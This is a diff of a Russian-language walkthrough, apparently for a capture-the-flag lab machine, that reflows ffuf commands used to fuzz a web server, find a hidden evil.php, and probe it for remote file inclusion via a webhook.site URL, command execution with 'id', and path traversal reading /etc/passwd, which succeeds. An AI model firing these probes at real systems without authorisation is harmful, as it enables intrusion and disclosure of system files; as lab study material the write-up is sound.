@@ -25,7 +25,8 @@ sudo nmap -sT -Pn -sV -T4 -A -p 22,80 $ip -oN scans/nmap.txt
 ![http](screenshots/apache.png)
 
 ```bash
-ffuf -fc 404 -t 100 -u http://$ip/FUZZ -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
+ffuf -fc 404 -t 100 -u http://$ip/FUZZ \
+-w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
 secret                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 1ms]
 server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7ms]
 ```
@@ -33,35 +34,42 @@ server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration:
 Дальнейшая вложенность не найдена:
 
 ```bash
-ffuf -fc 404 -t 100 -u http://$ip/secret/FUZZ -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
+ffuf -fc 404 -t 100 -u http://$ip/secret/FUZZ \
+-w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
 ```
 
 Поиск endpoint .php:
 
 ```bash
-ffuf -fc 404 -t 100 -u http://$ip/secret/FUZZ.php -w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
+ffuf -fc 404 -t 100 -u http://$ip/secret/FUZZ.php \
+-w /media/sf_Exchange/Dictionaries/Dir/directory-list-2.3-medium.txt
 evil                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 65ms]
 ```
 
 Проверка RFI не дала результатов:
 
 ```bash
-ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=https://webhook.site/bbd9abff-dfc8-4342-88be-1f98291143da -w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
+ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=https://webhook.site/bbd9abff-dfc8-4342-88be-1f98291143da \
+-w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
+-fs 0
 ```
 
 Проверка RCE не дала результатов:
 
 ```bash
-ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=id -w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
+ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=id \
+-w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
 ```
 ```bash
-ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=1 -w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
+ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=1 \
+-w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
 ```
 
 Проверка LFI:
 
 ```bash
-ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=../../../../etc/passwd -w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
+ffuf -t 100 -u http://$ip/secret/evil.php?FUZZ=../../../../etc/passwd \
+-w /media/sf_Exchange/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 0
 command                 [Status: 200, Size: 1455, Words: 13, Lines: 28, Duration: 2ms]
 ```
 ![passwd](screenshots/passwd.png)
